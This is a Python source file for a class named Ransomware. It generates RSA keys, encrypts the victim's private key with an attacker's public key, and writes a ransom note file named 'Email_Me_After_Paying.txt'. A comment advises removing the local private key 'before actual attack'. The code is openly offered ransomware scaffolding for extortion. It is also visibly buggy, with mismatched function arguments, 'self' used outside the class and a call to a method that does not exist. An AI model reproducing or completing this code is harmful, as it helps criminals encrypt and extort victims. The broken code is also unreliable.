import base64
import sys

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives import serialization as crypto_serialization
from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
from cryptography.hazmat.primitives import hashes as crypto_hashes
from pathlib import Path


class Ransomware:
    def __init__(self):
        self.pubkey_pem = None
        self.privkey_pem = None
        self.attacker_public_key = None

    def generate_asy_keys(self):
        private_key = rsa.generate_private_key(
            backend=crypto_default_backend(),
            public_exponent=65537,
            key_size=2048
        )
        self.pubkey_pem = private_key.public_key().public_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PublicFormat.SubjectPublicKeyInfo
        )
        self.privkey_pem = private_key.private_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PrivateFormat.PKCS8,
            crypto_serialization.NoEncryption())

    # Writes clients both keys to the disk. Delete private key section before actual attack.
    def write_keys(self):
        with open('private_key.txt', 'wb') as f1:
            f1.write(self.privkey_pem)
        with open('public_key.txt', 'wb') as f2:
            f2.write(self.pubkey_pem)

    def encrypt_private_key(self):
        sys.getsizeof(self.privkey_pem)
        with open('enc_private_key.txt', 'wb') as f:
            with open("./public.pem", "rb") as key_file:
                self.attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                                    backend=crypto_default_backend())
                enc_private_key = self.attacker_public_key.encrypt(self.privkey_pem, crypto_padding.OAEP(
                    mgf=crypto_padding.MGF1(
                        algorithm=crypto_hashes.SHA256()),
                    algorithm=crypto_hashes.SHA256(),
                    label=None
                ))
            f.write(enc_private_key)
        with open(Path.home() + "/Email_Me_After_Paying.txt", "wb") as fa:
            fa.write(enc_private_key)
        self.privkey_pem = None

    def enc_private_key(self):
        with open("./public.pem", "rb") as key_file:
            self.attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                                backend=crypto_default_backend())
        encrypt_blob(self.privkey_pem, self.attacker_public_key)
        self.privkey_pem = None


def encrypt_blob(fileblob):
    chunk_size = 100
    offset = 0
    end_loop = False
    encrypted = b""
    while not end_loop:
        chunk = fileblob[offset: offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            end_loop = True
            chunk += b" " * (chunk_size - len(chunk))
        print(chunk)
        enc_chunk = self.attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
            mgf=crypto_padding.MGF1(
                algorithm=crypto_hashes.SHA256()),
            algorithm=crypto_hashes.SHA256(),
            label=None
        ))
        encrypted += enc_chunk
        offset += chunk_size
    encrypted_blob = base64.b64encode(encrypted)
    with open("./Email_Me_After_Paying.txt", "wb") as fa:
        fa.write(encrypted_blob)


def main():
    foo = Ransomware()
    foo.generate_asy_keys()
    foo.write_keys()
    foo.encrypt_blob()


if __name__ == '__main__':
    main()
